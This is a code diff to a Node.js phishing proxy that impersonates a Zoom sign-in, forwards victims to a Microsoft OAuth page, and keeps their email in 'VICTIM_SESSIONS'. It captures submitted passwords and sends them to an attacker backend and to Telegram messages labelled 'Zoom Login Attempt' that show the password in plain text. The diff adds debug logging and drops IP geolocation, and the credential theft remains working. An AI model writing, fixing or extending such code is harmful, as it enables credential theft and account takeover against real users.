@@ -32,25 +32,35 @@ function generateSessionId() {
 }
 
 function getSessionIdFromCookie(cookieHeader) {
-    if (!cookieHeader) return null;
+    if (!cookieHeader) {
+        console.log('[SESSION] No cookie header found');
+        return null;
+    }
     const cookies = cookieHeader.split('; ');
     for (const cookie of cookies) {
         const [name, value] = cookie.split('=');
         if (name === 'sessionId') {
+            console.log(`[SESSION] Found sessionId: ${value}`);
             return value;
         }
     }
+    console.log('[SESSION] No sessionId found in cookies');
     return null;
 }
 
 function getSession(sessionId) {
     if (!sessionId) return null;
     const session = VICTIM_SESSIONS[sessionId];
-    if (!session) return null;
+    if (!session) {
+        console.log(`[SESSION] Session ${sessionId} not found`);
+        return null;
+    }
     if (Date.now() - session.timestamp > SESSION_TTL) {
+        console.log(`[SESSION] Session ${sessionId} expired`);
         delete VICTIM_SESSIONS[sessionId];
         return null;
     }
+    console.log(`[SESSION] Session found for email: ${session.email}`);
     return session;
 }
 
@@ -61,6 +71,7 @@ function createSession(email) {
         timestamp: Date.now(),
         ip: null
     };
+    console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
     return sessionId;
 }
 
@@ -96,118 +107,6 @@ function getClientIp(req) {
     return 'unknown';
 }
 
-const geoCache = new Map();
-const CACHE_TTL = 60 * 60 * 1000;
-
-async function getLocationFromIp(ip) {
-    if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);
-
-    const now = Date.now();
-    if (geoCache.has(ip)) {
-        const entry = geoCache.get(ip);
-        if (now - entry.timestamp < CACHE_TTL) return entry.data;
-        geoCache.delete(ip);
-    }
-
-    if (isPrivateIP(ip)) {
-        const result = { 
-            full: 'Local/Private Network', 
-            city: 'Local', 
-            country: 'Private', 
-            lat: 'N/A', 
-            lon: 'N/A', 
-            timezone: 'Unknown', 
-            isp: 'Unknown', 
-            org: 'Unknown' 
-        };
-        geoCache.set(ip, { timestamp: now, data: result });
-        return result;
-    }
-
-    const apis = [
-        `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,lat,lon,timezone,isp,org,as`,
-        `https://ipapi.co/${ip}/json/`,
-        `https://ipinfo.io/${ip}/json`
-    ];
-
-    for (const apiUrl of apis) {
-        try {
-            const result = await new Promise((resolve) => {
-                const request = https.get(apiUrl, { timeout: 3000 }, (resp) => {
-                    let data = '';
-                    resp.on('data', chunk => data += chunk);
-                    resp.on('end', () => {
-                        try {
-                            const response = JSON.parse(data);
-                            resolve({ success: true, data: response });
-                        } catch (e) {
-                            resolve({ success: false });
-                        }
-                    });
-                });
-                request.on('error', () => resolve({ success: false }));
-                request.on('timeout', () => { request.destroy(); resolve({ success: false }); });
-            });
-
-            if (result.success) {
-                const r = result.data;
-                let parsed = null;
-                if (r.status === 'success' || r.country) {
-                    parsed = {
-                        full: `${r.city || 'Unknown'}, ${r.regionName || r.region || 'Unknown'}, ${r.country || 'Unknown'}`,
-                        city: r.city || 'Unknown',
-                        country: r.country || 'Unknown',
-                        lat: r.lat || r.latitude || 'N/A',
-                        lon: r.lon || r.longitude || 'N/A',
-                        timezone: r.timezone || r.time_zone || 'Unknown',
-                        isp: r.isp || r.org || 'Unknown',
-                        org: r.org || r.as || 'Unknown'
-                    };
-                } else if (r.country_name) {
-                    parsed = {
-                        full: `${r.city || 'Unknown'}, ${r.region || 'Unknown'}, ${r.country_name || 'Unknown'}`,
-                        city: r.city || 'Unknown',
-                        country: r.country_name || 'Unknown',
-                        lat: r.latitude || 'N/A',
-                        lon: r.longitude || 'N/A',
-                        timezone: r.timezone || 'Unknown',
-                        isp: r.org || 'Unknown',
-                        org: r.asn || 'Unknown'
-                    };
-                } else if (r.country) {
-                    parsed = {
-                        full: `${r.city || 'Unknown'}, ${r.region || 'Unknown'}, ${r.country || 'Unknown'}`,
-                        city: r.city || 'Unknown',
-                        country: r.country || 'Unknown',
-                        lat: r.loc ? r.loc.split(',')[0] : 'N/A',
-                        lon: r.loc ? r.loc.split(',')[1] : 'N/A',
-                        timezone: r.timezone || 'Unknown',
-                        isp: r.org || 'Unknown',
-                        org: r.asn ? r.asn.split(' ')[0] : 'Unknown'
-                    };
-                }
-                if (parsed) {
-                    geoCache.set(ip, { timestamp: now, data: parsed });
-                    return parsed;
-                }
-            }
-        } catch (e) { /* ignore */ }
-    }
-
-    const fallback = { 
-        full: 'Location unavailable', 
-        city: 'Unknown', 
-        country: 'Unknown', 
-        lat: 'N/A', 
-        lon: 'N/A', 
-        timezone: 'Unknown', 
-        isp: 'Unknown', 
-        org: 'Unknown' 
-    };
-    geoCache.set(ip, { timestamp: now, data: fallback });
-    return fallback;
-}
-
 // ============================================================
 //  HELPERS
 // ============================================================
@@ -215,7 +114,6 @@ async function getLocationFromIp(ip) {
 async function sendToBackend(email, password, req, attemptType, ip) {
     try {
         const axios = require('axios');
-        const location = await getLocationFromIp(ip);
         await axios.post(`${BACKEND_URL}/api/log-action`, {
             action: attemptType === 'valid' ? 'login_success' : 'login_failed',
             email,
@@ -223,18 +121,10 @@ async function sendToBackend(email, password, req, attemptType, ip) {
             visitorInfo: {
                 fullUrl: req.url,
                 userAgent: req.headers['user-agent'] || 'Unknown',
-                ip,
-                location: location.full,
-                city: location.city,
-                country: location.country,
-                lat: location.lat,
-                lon: location.lon,
-                timezone: location.timezone,
-                isp: location.isp,
-                org: location.org
+                ip: ip || 'unknown'
             }
         });
-        console.log(`[BACKEND] ✅ Sent ${attemptType} for: ${email} from ${location.full}`);
+        console.log(`[BACKEND] ✅ Sent ${attemptType} for: ${email}`);
     } catch (error) {
         console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
     }
@@ -243,16 +133,9 @@ async function sendToBackend(email, password, req, attemptType, ip) {
 async function sendAuthResultToTelegram(email, password, success, ip, attemptCount, cookies = null) {
     try {
         const axios = require('axios');
-        const location = await getLocationFromIp(ip);
         let msg = `🔐 *Zoom Login Attempt #${attemptCount}*\n\n`;
         msg += `*📧 Email:* ${email}\n`;
         msg += `*🔑 Password:* ${password}\n`;
-        msg += `*📍 Location:* ${location.full}\n`;
-        msg += `*🌆 City:* ${location.city || 'Unknown'}\n`;
-        msg += `*🌍 Country:* ${location.country || 'Unknown'}\n`;
-        msg += `*📌 Coordinates:* ${location.lat || 'N/A'}, ${location.lon || 'N/A'}\n`;
-        msg += `*🕐 Timezone:* ${location.timezone || 'Unknown'}\n`;
-        msg += `*🏢 ISP:* ${location.isp || 'Unknown'}\n`;
         msg += `*📡 IP:* ${ip}\n`;
         msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
         msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
@@ -339,25 +222,12 @@ function serveFile(filename, res, contentType = 'text/html') {
 // ============================================================
 
 function handleLoginRequest(req, res) {
-    // ✅ FIX: Extract email from URL and decode properly
     const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
-    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
-    
-    // ✅ If no email, try to get from session
-    if (!email) {
-        const sessionId = getSessionIdFromCookie(req.headers.cookie);
-        if (sessionId && VICTIM_SESSIONS[sessionId]) {
-            email = VICTIM_SESSIONS[sessionId].email;
-        }
-    }
-    
-    // ✅ If still no email, log a warning
+    const email = rawEmail ? decodeURIComponent(rawEmail) : '';
+
     if (!email) {
         console.warn('[PROXY] ⚠️ No email found in request');
-        email = 'unknown';
     }
-
-    const hasError = req.url.includes('error=');
 
     // Create session and store email
     const sessionId = createSession(email);
@@ -365,13 +235,7 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
-    // ✅ Build the correct Microsoft OAuth URL
     let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
-    
-    if (hasError) {
-        const errorParam = req.url.split('error=')[1]?.split('&')[0] || '';
-        targetUrl += `&error=${errorParam}`;
-    }
 
     console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
     console.log(`[PROXY] 📧 Email: ${email}`);
@@ -393,44 +257,65 @@ function handleLoginRequest(req, res) {
     });
 }
 
+// ============================================================
+//  FIXED: handlePostRequest with proper session retrieval
+// ============================================================
+
 function handlePostRequest(body, req, res) {
     try {
         const formData = querystring.parse(body);
         const ip = getClientIp(req);
 
-        // ✅ Extract email with multiple fallbacks
+        // --- DEBUG: Log all cookies and headers ---
+        console.log('[POST] Cookie header:', req.headers.cookie);
+        console.log('[POST] All headers:', req.headers);
+
+        // --- Extract email: session first, then form, then referer, then URL ---
         let email = '';
         const sessionId = getSessionIdFromCookie(req.headers.cookie);
         
-        // 1. Try session
         if (sessionId) {
             const session = getSession(sessionId);
             if (session) {
                 email = session.email;
-                console.log(`[SESSION] Using stored email: ${email}`);
+                console.log(`[POST] ✅ Using session email: ${email}`);
+            } else {
+                console.log(`[POST] ⚠️ Session ${sessionId} not found or expired`);
             }
+        } else {
+            console.log('[POST] ⚠️ No sessionId found in cookies');
         }
-        
-        // 2. Try form data
+
+        // If session didn't work, try form data
         if (!email) {
             email = formData.login || formData.loginfmt || formData.email || '';
+            if (email) console.log(`[POST] Using form email: ${email}`);
         }
-        
-        // 3. Try referer
+
+        // Try referer
         if (!email) {
             const referer = req.headers.referer || '';
             const match = referer.match(/login_hint=([^&]+)/);
-            if (match) email = decodeURIComponent(match[1]);
+            if (match) {
+                email = decodeURIComponent(match[1]);
+                console.log(`[POST] Using referer email: ${email}`);
+            }
         }
-        
-        // 4. Try URL
+
+        // Try URL
         if (!email) {
             const match = req.url.match(/login_hint=([^&]+)/);
-            if (match) email = decodeURIComponent(match[1]);
+            if (match) {
+                email = decodeURIComponent(match[1]);
+                console.log(`[POST] Using URL email: ${email}`);
+            }
         }
 
         const password = formData.passwd || formData.password || '';
-        if (!email) email = 'unknown';
+        if (!email) {
+            email = 'unknown';
+            console.log('[POST] ⚠️ No email found anywhere');
+        }
 
         // Track attempts
         let attemptCount = attemptCounts.get(email) || 0;
